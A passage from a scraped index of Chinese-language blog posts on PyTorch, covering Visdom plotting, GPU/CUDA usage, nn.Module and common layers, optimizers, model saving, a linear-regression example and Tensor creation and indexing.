visdom成功启动后，会返回一个网址（如下图）。根据显示的网址然后在浏览器里输入：http://localhost:8097 进行登录。 注意： 需要手动指定保存env，可以在web界面点击save按钮 or 在程序中调用save方法。否则重启后env信息会消失 cs之间使用tornado，可视化操作不会阻塞当前程序，网络异常也不会导致程序退出 常用操作： Visdom可视化神经网络的训练过程大致分为3步： 实例化一个窗口 初始化窗口的信息 更新监听的信息 import torch as t import visdom # 新建一个连接客户端 # 指定env = u'test1'，默认端口为8097，host是‘localhost' vis = visdom.Visdom(env=u'test1',use_incoming_socket=False) x = t.arange(1, 30, 0.01) y = t.sin(x) vis.line(X=x, Y=y, win='sinx', opts={'title': 'y=sin(x)'}) Visdom支持Pytorch的Tensor和Numpy的ndarray，但是不支持Python的int、float等，因此每次传入数据都需要转换成ndarry或者Tensor数据类型 有两个使用较多的参数： win:指定pane的名字，如果不指定会自动分配一个新的pane，如果两次操作指定相同的pane，那么新的操作会覆盖当前pane的内容。建议每次操作都重新指定pene ops:可视化配置，接收一个字典，主要用于设置pean的显示格式 训练过程中，为了避免覆盖之前的pane的内容，需要指定参数 update='append,处理使用update参数，还可以使用vis.updateTrace方法更新图 vis作为一个客户端对象，可以使用常见的画图函数，包括： line：类似Matlab中的plot操作，用于记录某些标量的变化，如损失、准确率等 image：可视化图片，可以是输入的图片，也可以是GAN生成的图片，还可以是卷积核的信息 text：用于记录日志等文字信息，支持html格式 histgram：可视化分布，主要是查看数据、参数的分布 scatter：绘制散点图 bar：绘制柱状图 监听单一数据：示例：监听train_loss的变化 # 首先导入库 from visdom import Visdom import numpy as np import time # 1.实例化一个窗口 wind = Visdom(env=u\"test1\", use_incoming_socket=False) # 2.初始化窗口信息 wind.line([0.], # Y的第一个点的坐标 [0.], # X的第一个点的坐标 win='train_loss', # 窗口的名称 opts=dict(title='train_loss') # 图像的标例 ) # 3.更新数据 for step in range(10): # 随机获取loss,这里只是模拟实现 loss = np.random.randn() * 0.5 + 2 wind.line([loss], [step], win='train_loss', update='append') # wind.line() update='append' time.sleep(0.5) 监听多条数据：示例：监听train_loss和acc from visdom import Visdom import numpy as np import time # 实例化窗口 wind = Visdom() # 初始化窗口参数 wind.line([[0., 0.]], [0.], win='train', opts=dict(title='loss\u0026acc', legend=['loss', 'acc'])) # 更新窗口数据 for step in range(10): loss = 0.2 * np.random.randn() + 1 acc = 0.1 * np.random.randn() + 0.5 wind.line([[loss, acc]], [step], win='train', update='append') time.sleep(0.5) 通过update参数（append/new）控制数据更新： import visdom import torch as t vis = visdom.Visdom(env=\"image test\") # append 追加数据 for ii in range(0, 10): # y = x x = t.Tensor([ii]) y = x vis.line(X=x, Y=y, win='polynomial', update='append' if ii \u003e 0 else None) # updateTrace 新增一条线 x = t.arange(0, 9, 0.1) y = (x ** 2) / 9 vis.line(X=x, Y=y, win='polynomial', name='this is a new Trace', update='new') Visdom可视化图像： image接收一个二维(HxW)或三维(3xHxW)的向量 images接收一个四维向量(NxCxHxW),类似torchvision中的make_grid功能，将多张image拼接在一起 from visdom import Visdom import cv2 import numpy as np import torch import os # 新建一个连接客户端 # 指定env = u'test1'，默认端口为8097，host是‘localhost' vis = Visdom(env=u'test1',use_incoming_socket=False) # 读入图像 path1 = os.getcwd() print(\"Current Path: {0}\".format(path1)) image = cv2.imread('gudongche-01.jpg') # # openCV按照BGR读取，而visdom 默认按照RGB显示,因此要进行通道转换 img = cv2.cvtColor(image, cv2.COLOR_BGR2RGB) # visdom类似于pytorch中的卷积模型，接收的数据都要求通道数在前 img = np.transpose(img, (2, 0, 1)) # 将numpy类型转换为torch类型 img = torch.from_numpy(img) # 可视化图像 vis.image(img, win='test') # # viz.image( # img, # opts={'title': 'Random!', 'caption': 'Click me!'}, 在一个image窗口中不断更新显示图像: import time import cv2 import visdom import numpy as np viz = visdom.Visdom(env=\"image test\") img = cv2.imread(\"gudongche-01.jpg\") img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB) img = np.transpose(img, (2, 0, 1)) # img = img.astype(np.float32) / 255 print(img.shape, img.dtype) # image demo image = viz.image(np.random.rand(3, 256, 256), opts={'title': 'image1', 'caption': 'How random.'}) for i in range(100): viz.image(np.random.randn(3, 256, 256), win=image) time.sleep(0.5) 多个图像： import time import cv2 import visdom import numpy as np viz = visdom.Visdom(env=\"image test\") img = cv2.imread(\"gudongche-01.jpg\") img = c","date":"2022-09-05","objectID":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/:3:2","tags":["PyTorch","Dataset","DataLoader"],"title":"Pytorch常用工具","uri":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["AI"],"content":"使用GPU加速：CUDA PyTorch中Tensor和nn.Module(包含常用的layer、损失函数、容器Sequential等)数据结构分为CPU和GPU两个版本，这两个数据结构都带有一个.cuda()方法(转换成对应的GPU对象) Note: tensor.cuda会返回一个新对象，新对象的数据转移到GPU上，之前的Tensor还在原理的CPU上 module.cuda会返回自己，将所有数据迁移到GPU上。其本质也是利用了Tensor 除了.cuda方法，还有.to(device)方法 使用建议： 较小的计算直接在CPU计算，无须放到GPU CPU与GPU之间传递数据比较耗时，尽量避免 t1 = t.Tensor(3,4) # 返回一个新的tensor，保存在第一块GPU上，原来的Tensor没有改变 t1.cuda(0) # 如果不写0，默认是第一块 t1.is_cuda # False n2 = nn.Linear(3,4) n2.cuda(device=1) n2.weight.is_cuda # True # 使用to()转移 t2 = t.Tensor(3,4) t2.to('cuda:0') t2.is_cuda Note：大部分损失函数属于nn.Module，用户经常忘记使用.cuda方法，大部分时候不会报错，是因为损失函数没有可学习参数，但为了保险起见，尽量加上criterion.cuda ... criterion.cuda() loss = criterion(input, target) ... 除了.cuda，还可以通过torch.cuda.device指定默认使用哪块GPU，或者使用torch.set_default_tensor_type('torch.cuda.FloatTensor')指定默认的Tensor类型为GPU上的...执行默认GPU，不需要手动调用.cuda 如果有多块GPU，手工.cuda(1)切换比较繁琐，有两种替代方法： 先调用torch.cuda.set_device(1)指定使用第二块GPU，后续的.cuda都无须更改，切换CPU只需修改这一行代码 设置环境变量：CUDA_VISIBLE_DEVICES 指定Tensor加载的设备 # t.device('cpu') # t.device('cpu',0) # t.device('cuda:0') # t.device('cuda',0) ### 推荐写法 device = t.device(\"cuda\" if t.cuda.is_available() else \"cpu\") # 在确定了设备之后，可以利用to方法将数据与模型加载到指定设备上 x = t.empty((2,3)).to(device) 使用torch.Tensor.new_*或torch.*_like可以创建与该Tensor具有相同类型、相同设备的Tensor ","date":"2022-09-05","objectID":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/:4:0","tags":["PyTorch","Dataset","DataLoader"],"title":"Pytorch常用工具","uri":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["AI"],"content":"nn.Mdule torch.nn是专门为深度学习设计的模块，它的核心数据结构是Module 以实现全连接层(仿射层)为例，它的输出y和输入x满足$y=wx+b$ import torch as t from torch import nn # 继承nn.Module class Linear(nn.Module): # 必须重写__init__()和前向传播函数forward def __init__(self, in_feature, out_feature): super().__init__() # 记得调用 # __init__()中可自行定义可学习参数，并封装成nn.Parameter(是一种特殊的tensor，默认徐亚求导) # nn.Parameter内的参数是网络中的可学习参数 self.W = nn.Parameter(t.randn(in_feature, out_feature)) self.b = nn.Parameter(t.randn(out_feature)) # 比如一些层都可以定义在这里 def forward(self, x): \"\"\" 实现了前向传播,它的输入可以是一个或者多个tensor :param x: :return: \"\"\" x = x.mm(self.W) # 矩阵乘法，相当于x@(self.W) return x + self.b.expand_as(x) # 反向传播无需手动编写，nn.Module能利用autograd自动实现反向传播，这笔Function简单许多 layer1 = Linear(4,3) input = t.randn(2,4) output = layer1(input) print(output) # 可学习参数会通过named_parameters返回一个迭代器 for name, parameter in layer1.named_parameters(): print(name, parameter) # w和b 实现多层感知机(MLP) \"\"\" 多层感知机 \"\"\" import torch as t from torch import nn # 继承nn.Module class Linear(nn.Module): # 必须重写__init__()和前向传播函数forward def __init__(self, in_feature, out_feature): super().__init__() # 记得调用 # __init__()中可自行定义可学习参数，并封装成nn.Parameter(是一种特殊的tensor，默认徐亚求导) # nn.Parameter内的参数是网络中的可学习参数 self.W = nn.Parameter(t.randn(in_feature, out_feature)) self.b = nn.Parameter(t.randn(out_feature)) # 比如一些层都可以定义在这里 def forward(self, x): \"\"\" 实现了前向传播,它的输入可以是一个或者多个tensor :param x: :return: \"\"\" x = x.mm(self.W) # 矩阵乘法，相当于x@(self.W) return x + self.b.expand_as(x) # 反向传播无需手动编写，nn.Module能利用autograd自动实现反向传播，这笔Function简单许多 class Perceptron(nn.Module): \"\"\" 多层感知机MLP \"\"\" def __init__(self, in_feature, hidden_feature, out_feature): super().__init__() # 记得调用 # 此处的Linear是前面自定义的全连接层 self.layer1 = Linear(in_feature, hidden_feature) self.layer2 = Linear(in_feature, out_feature) # 在forwar中加上各层之间的处理函数，并定义层与层之间的关系 def forward(self, x): x = self.layer1(x) x = t.sigmoid(x) x = self.layer2(x) return x perception = Perceptron(3,4,1) for name, parameter in perception.named_parameters(): print(name, parameter.size()) # w和b MLP运行结果： layer1.W torch.Size([3, 1]) layer1.b torch.Size([1]) layer2.W torch.Size([3, 1]) layer2.b torch.Size([1]) nn.Modlue还有很多其他层，可以自己翻看官方文档，有以下几个主注意的点： 1.关注构造参数的作用 2.关注属性、可学习的网络、和包含的子Module 3.输入输出的形状 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:1:0","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":"常用的神经网络层 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:2:0","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":"图像相关层 1.卷积层 卷积层的本质就是卷积层、池化层、激活层及其它层的叠加 https://pytorch.org/docs/stable/nn.html#convolution-layers 以二维卷积类Conv2d为例： https://pytorch.org/docs/stable/generated/torch.nn.Conv2d.html#torch.nn.Conv2d 卷积输出结果的形状： 2.池化层 主要用于下采样。 增加池化层可以保留主要特征的同时降低参数量，从而在一定程度上防止过拟合。 池化层没有学习参数 https://pytorch.org/docs/stable/nn.html#pooling-layers 3.其他层 Linear：全连接层 BatchNorm:批标准化层 Dropout:防止过拟合 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:2:1","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":"激活函数 PyTorch实现了常见激活函数，他们可以作为独立的Layer使用 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:2:2","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":"构建神经网络 前面的层都是前一层直接作为下一层的输入，这种称为前馈神经网络(FNN). 对于此类网络，重写forward比较麻烦，可以简化使用： Sequential：特殊的module，可以包含多个子module，在前向传播时候会将输入一层层传递下去 和ModuleList：特殊的module，可以包含多个子module，可以向list一样视同，但是不能直接将输入传给ModuleList Sequential的三种写法 import torch as t from torch import nn # 第一种 net1 = nn.Sequential() net1.add_module('conv', nn.Conv2d(3,3,3)) net1.add_module('batchnorm', nn.BatchNorm2d(3)) net1.add_module('active', nn.ReLU()) # 第二种 net2 = nn.Sequential( nn.Conv2d(3,3,3), nn.BatchNorm2d(3), nn.ReLU() ) # 第三种 from collections import OrderedDict net3 = nn.Sequential(OrderedDict([ ('conv',nn.Conv2d(3,3,3)), ('batchnorm',nn.BatchNorm2d(3)), ('active', nn.ReLU()), ])) print(net1) \"\"\" Sequential( (conv): Conv2d(3, 3, kernel_size=(3, 3), stride=(1, 1)) (batchnorm): BatchNorm2d(3, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (active): ReLU() ) \"\"\" # 可以根据名字或者序号取出子module print(net1[1]) print(net2.conv) 为什么多此一举用ModuleList，而不用自带的list呢？ class MyModule(nn.Module): def __init__(self): super().__init__() self.li = [nn.Linear(3,4), nn.Conv2d(3,3,(1,2)), nn.ReLU()] # 自定义的list不能被主module识别，在反向传播的时候将无法调整子module的参数 self.module_li = nn.ModuleList([nn.Linear(3,4), nn.Conv2d(3,3,(1,2)), nn.ReLU()]) #能被主module识别 def forward(self): pass 除了ModuleList，还有ParameterList 如果在__init__()中需要构造list/tuple/dict等对象，那么一定要思考是够该用ModuleList和ParameterList代替 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:2:3","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":"RNN … ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:2:4","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":"nn.functional nn.module中大多数的layer在nn.functional中都有一个阈值对应的函数。 区别： 使用nn.module实现的layer是一个特殊的类，会自动提取可学习参数 使用nn.functional实现的layer更像是纯函数 使用： 如果模型具有可学习参数，那么最好使用nn.module，否则都行。 对于激活函数层、池化层等都没有可学习参数(Note:也不用放在构造函数__init__中)，但还是建议使用nn.module中 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:3:0","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":"优化器 常用的优化方法封装在torch.optim中，所有优化方法都继承自optim.Optimizer 应学会使用： 优化方法的基本使用方法 如何对模型的不同部分设置不同的学习率 如歌调整学习率 这里以SGD为例： # 以前面的多层感知机为例 # ... from torch import optim # 为一个网络设置学习率 optimizer = optim.SGD(params=perception.parameters(), lr=1) optimizer.zero_grad() # 梯度清零，等价于 net.zero_grad() input = t.rand(32,3) out = perception(input) out.backward(out) # 真正的反向传播过程在下一步执行 optimizer.step() # 执行优化 # 不同参数设置不同的学习率 bias_params = [param for name, param in perception.named_parameters() if name.endswith('.b')] weight_params = [param for name, param in perception.named_parameters() if name.endswith('.W')] optimizer = optim.SGD([ {'parms':bias_params}, {'parms':weight_params, lr = 0.0001} ], lr=0.1) 调整学习率有两种做法： 修改optimizer.param_group中对应学习率 新建一个优化器 # 新建一个优化器 optimizer = optim.SGD([ {'parms':bias_params}, {'parms':weight_params, lr = 0.0001} ], lr=0.1) # 手动衰减学习率，保存动量 for param_group in optimizer.param_groups: param_group['lr'] *= 0.1 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:4:0","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":"PyTorch中保存模型 # 所有module对象都具有state_dict()函数,会返回当前module所有状态数据。保存后下次使用利用load_state_dict加载进来 t.save(perception.state_dict(), \"多层感知机.pth\") perception2 = Perceptron(3,4,1) perception2.load_state_dict(t.load(\"多层感知机.pth\")) ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:5:0","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":"在GPU上运行module 两步： model=model.cuda：将模型的所有参数转存到GPU上 inout.cuda：将输入数据防止在GPU上 多块GPU上进行并行计算，PyTorch提供了2个函数： nn.parallel.data_parallel() 直接利用多块GPU并行得到计算结果 和nn.parallel.DataParallel()返回一个新的module，能够自动在多块GPU上进行并行加速 # 方法1 new_net = nn.parallel.DataParallel(perception, device_ids=[0,1]) out = new_net(input) # 将一个batch的数据均分成多分，分别送到对应的GPU上进行计算，然后将各块GPU得到的梯度进行累加... # 方法2 nn.parallel.data_parallel(new_net, input,device_ids=[0,1] ) ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:6:0","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":"使用PyTorch实现线性回归(与前一篇文章作对比) import torch # 1.准备数据集 x_data = torch.Tensor([[1.0], [2.0], [3.0]]) # 3行1列的tensor y_data = torch.Tensor([[2.0], [4.0], [6.0]]) # 2.使用类来设计模型 class LinearModel(torch.nn.Module): # Module构造出来的对象，会自动构建反向传播过程 def __init__(self): super(LinearModel, self).__init__() self.linear = torch.nn.Linear(1, 1) # torch.nn.Linear构造一个对象，参数是权重和偏差，也是继承子Module的会自动进行反向传播 # (in_features: size, out_features: size of each out feature, bias=True:要不要偏置量) def forward(self, x): # 实现这个方法 # 计算 y heat y_pred = self.linear(x) # linear是前面建立的对象，可调用的callable的对象（def __call__(self, *args, **kwargs)） return y_pred model = LinearModel() # model是callable的 model(x) # 3.构建损失和优化器 criterion = torch.nn.MSELoss(size_average=False) optimizer = torch.optim.SGD(model.parameters(), lr=0.01) # 梯度下降 # 可以尝试不同的优化器 # 4.训练 for epoch in range(100): y_pred = model(x_data) # 1.前向传播，计算y heat loss = criterion(y_pred, y_data) # 2.计算损失 print(epoch, loss) # 打印 optimizer.zero_grad() # 梯度会自动计算，务必梯度清零！ loss.backward() # 3.反向传播 optimizer.step() # 4.更新 update # 打印权重和偏置 print(\"w=\", model.linear.weight.item()) # model下面的linear，下面的weight print(\"b=\", model.linear.bias.item()) # 测试模型 x_test = torch.Tensor([[4.0]]) y_test = model(x_test) print(\"y_pred=\", y_test.data) ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-nn/:7:0","tags":["PyTorch","nn","深度学习"],"title":"Pytorch学习-nn","uri":"/pytorch%E5%AD%A6%E4%B9%A0-nn/"},{"categories":["AI"],"content":" Tensor ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:0:0","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"Tensor基础 Tensor，又名张量。 可以简单认为Tensor是一个支持高效科学计算的数组。它可以是一个数(标量)、一维数组(向量)、二维数组(矩阵、黑白图像等)、或者更高维的数组(高阶数据、视频等)。它与Numpy的ndarray类似，但Tensor支持GPU加速。 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:1:0","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"基本操作 与Numpy的接口设计比较类似。 比如torch.sum(a,b)和s.sum(b)是等价的 从修改存储角度，分为两类操作： 不会修改自身存储的数据的操作，如a.add(b)，加法结果会返回一个新的tensor 会修改自身存储的数据的操作，如a.ddd_(b)，有个下划线，加法的结果会被存储在a中返回 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:2:0","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"1.创建Tensor 创建方法很多，常用的如下表： 函数 功能 Tensor(*sizes) 基础构造函数 tensor(data,) 类似np.array的构造函数 ones(*sizes) 全1Tensor zeros(*sizes) 全0Tensor eye(*sizes) 对角线为1，其他为0 arange(s,e,step) 从s到e，步长为step linspace(s,e,steps) 从s到e，均匀切分成steps份 rand/randn(*sizes) 均匀/标准分布 normal(mean,std)/uniform(from,to) 正态分布/均匀分布 randperm(m) 随机排列 上表中创建数据类型的同时可以指定数据类型dtype和存储设备device 创建未初始化的 5,3 维度的Tensor # 创建未初始化的 5,3 维度的Tensor x = t.empty(5, 3) print(x) # 输出 tensor([[1.5695e-43, 1.5554e-43, 1.5975e-43], [1.3593e-43, 1.5975e-43, 1.4714e-43], [1.5134e-43, 1.6956e-43, 4.4842e-44], [1.6395e-43, 1.5414e-43, 1.3593e-43], [1.6535e-43, 1.3593e-43, 1.4714e-43]]) 创建一个5x3的随机初始化的Tensor: x = torch.rand(5, 3) print(x) 创建一个5x3的long型全0的Tensor: x = torch.zeros(5, 3, dtype=torch.long) print(x) 直接根据数据创建: x = torch.tensor([[5.5, 3], [1,2]]) print(x) #输出 tensor([[5.5000, 3.0000], [1.0000, 2.0000]]) 输入数据是一个Tensor: x = torch.Tensor(torch.rand(2,6)) x 指定形状： x = torch.Tensor(3,7) x 通过现有的Tensor来创建: 此方法会默认重用输入Tensor的一些属性，例如数据类型，除非自定义数据类型 x = x.new_ones(5, 3, dtype=torch.float64) # 返回的tensor默认具有相同的torch.dtype和torch.device print(x) x = torch.randn_like(x, dtype=torch.float) # 指定新的数据类型 print(x) torch.ones()相关 torch.ones(2,3) # 创建形状2,3的全1的tensor torch.zeros(2,3) # 创建形状2,3的全0的tensor torch.ones_like(input_t) # 创建一个跟输入tensor形状一样的全1的tensor torch.eye(2,3, dtype=t.int) # 创建一个对角线值为1，其余值为0的tensor torch.Tensor()与torch.tensor()区别： torch.Tensor()是类，默认是torch.FloatTensor() torch.tensor()是函数，data支持list/tuple/array/scalar等类型。直接从data进行数据复制，并根据源数据的类型生成对应类型的Tensor。且其接口与numoy更像，所以更推荐这种创建方法 # torch.Tensor()能直接创建空的张量 torch.Tensor() # torch.tensor()不能创建空的，必须传入一个数据 torch.tensor() # 报错：TypeError: tensor() missing 1 required positional arguments: \"data\" torch.tensor(()) # 等效与创建空的 创建一个起始值为1，终止值为19，步长为1的tensor: torch.arange(1, 19, 3) 创建一个区间内3等份是tensor: torch.linspace(1,10,3) 创建一个形状的tensor，取值是标准正态分布中抽取的随机值: torch.randn(2,3) 长度为5，随机排列的: torch.randperm(5) 创建一个大小为(2,3)，值全1的tensor，保留原始的数据类型和设备: a = tensor.tensor((), dtype=tensor.int32) a.new_ones((2,3)) 通过shape或者size()来获取Tensor的形状: print(x.size()) # 注意：返回的torch.Size其实就是一个tuple, 支持所有tuple的操作。 print(x.shape) 统计元素总数: a.numel() a.nelement() ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:2:1","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"2.Tensor的类型 设备类型： cuda cpu t.dtype 数据类型： 每个数据类型都有CPU和GPU版本 t.device 不同数据类型Tensor之间相互转换的方法： 如：tensor.type(new_type),快捷方法tensor.float(),tensor.half()等 设备类型转换：t.cuda(),t.cpu(),或t.to(divice) t.*_like(t1)生成和t1相同属性的新tensor,t.new_*(new_shape)生成和相同属性但是相撞不同的新tensor,t1.as_type(t2)修改tensor的类型 # 以下代码只有在PyTorch GPU版本上才会执行 if torch.cuda.is_available(): device = torch.device(\"cuda\") # GPU y = torch.ones_like(x, device=device) # 直接创建一个在GPU上的Tensor x = x.to(device) # 等价于 .to(\"cuda\") z = x + y print(z) print(z.to(\"cpu\", torch.double)) # to()还可以同时更改数据类型 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:2:2","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"3.索引 Note:索引出来的结果与原数据共享内存，也即修改一个，另一个会跟着修改。 比如： y = x[0, :] y += 1 print(y) print(x[0, :]) # 源tensor也被改了 # 输出 tensor([1.4963, 1.1113, 1.8689, 1.4671, 1.9555, 1.4945]) tensor([1.4963, 1.1113, 1.8689, 1.4671, 1.9555, 1.4945]) 常见索引： \"\"\" 对于x tensor([[1.4963, 1.1113, 1.8689, 1.4671, 1.9555, 1.4945], [0.7284, 0.2248, 0.1715, 0.6737, 0.0110, 0.6075]]) \"\"\" x[0] # 第一行 x[:, 1] # 第二列 x[1, -2:] # 第二行最后两个元素 # 返回布尔值 print(x\u003e1) tensor([[ True, True, True, True, True, True], [False, False, False, False, False, False]]) print((x\u003e1).int()) 返回满足条件的结果： print(x[x\u003e1]) # 返回的结果不共享内存 print(x.masked_select(x\u003e1)) # where保留原始索引，不满足条件位置置0 print(torch.where(x\u003e1), x, torch.zeros_like(x)) 除了常用索引来选择数据，还有一些高级的选择函数： 级的选择函数: 函数 功能 index_select(input, dim, index) 在指定维度dim上选取，比如选取某些行、某些列 masked_select(input, mask) 例子如上，a[a\u003e0]，使用ByteTensor进行选取，选取结果不共享内存 nonzero(input) 非0元素的下标 gather(input, dim, index) 根据index，在dim维度上选取数据，输出的size与index一样 gather: a = torch.arange(0,16).view(4,4) # 选择对角线上元素 index = t.tensor([0,1,2,3]) a.gather(0, index) # 选择反对角线上元素 index = t.tensor([3,2,1,0]).t() a.gather(1, index) gather的逆操作：scatter_。gather将数据从input中按index取出；scatter_将按照index数据写入 scatter_是inplace操作，会直接对当前数据进行修改 item():将一个标量Tensor转换成一个Python number： # 只针对包含一个元素的tensor有效 x = torch.randn(1) print(x) print(x.item()) ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:2:3","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"4.拼接 cat(tensor,dim):将多个tensor在指定维度上进行拼接 stack(tensor,dim):将多个tensor沿一个新的维度进行拼接 a = torch.arange(0,16).view(2,8) # cat执行在dim=0上拼接 torch.cat((a,a), 0) #结果 tensor([[ 0, 1, 2, 3, 4, 5, 6, 7], [ 8, 9, 10, 11, 12, 13, 14, 15], [ 0, 1, 2, 3, 4, 5, 6, 7], [ 8, 9, 10, 11, 12, 13, 14, 15]]) # cat执行在dim=1上拼接 torch.cat((a,a), 0) #结果 tensor([[ 0, 1, 2, 3, 4, 5, 6, 7, 0, 1, 2, 3, 4, 5, 6, 7], [ 8, 9, 10, 11, 12, 13, 14, 15, 8, 9, 10, 11, 12, 13, 14, 15]]) # stack在dim=0上拼接 b = torch.stack((a,a), 0) #结果 tensor([[[ 0, 1, 2, 3, 4, 5, 6, 7], [ 8, 9, 10, 11, 12, 13, 14, 15]], [[ 0, 1, 2, 3, 4, 5, 6, 7], [ 8, 9, 10, 11, 12, 13, 14, 15]]]) #形状 print(b.shape) torch.Size([2, 2, 8]) 高级索引 不与原tensor共享内存 a = torch.arange(0,16).view(2,2,4) a[[1,0], [1,1], [2,0]] # a[1,1,2] 和a[0,1,0] # tensor([14, 4]) ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:2:4","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"5.逐元素\u0026归并操作 常用逐元素操作： 举例： clamp(torch.clamp(a,min=2,max=4)) # 上下截断 常用归并操作： 大多数执行归并函数都有一个维度参数dim，指定在哪个维度上进行 关于dim的解释有点乱，下面是经验总结(并非所有函数都符号如下变化)： 假设输入形状(m,n,k): 如果指定dim=0，那么输出形状为(1,n,k)或(n,k) 如果指定dim=1，那么输出形状为(m,1,k)或(m,k) 如果指定dim=2，那么输出形状为(m,n,1)或(m,n) 维度中是否有1，取决于参数keepdim是否为True(保留维度) (b.sum(dim=0, keepdim=False)).shape #torch.Size([3]) (b.sum(dim=0, keepdim=True)).shape # torch.Size([1, 3]) # b.sum(dim=0) # tensor([2., 2., 2.]) b.sum(dim=1) # tensor([3., 3.]) ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:2:5","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"6.比较 以max为例，有三种情况： max(input) max(input, dim) 指定维度返回最大值 max(tensor1, tensor2) 返回两个tensor上对应位置较大的元素 比较两个整形tensor可以用==比较，对于有精度限制的浮点数需要使用allclose比较 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:2:6","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"7.算术操作 加法: add() 减法: sub 乘法: multiply 除法: div 倒数: reciprocal 同一个操作有很多种形式，以加法为例子： ## 形式1 y = torch.rand(5, 3) print(x + y) ## 形式2 print(torch.add(x, y)) # 还可以指定输出 result = torch.empty(5, 3) torch.add(x, y, out=result) print(result) # 形式3：inplace # adds x to y y.add_(x) print(y) 注：PyTorch操作inplace版本都有后缀_, 例如x.copy_(y), x.t_() ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:2:7","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"改变形状 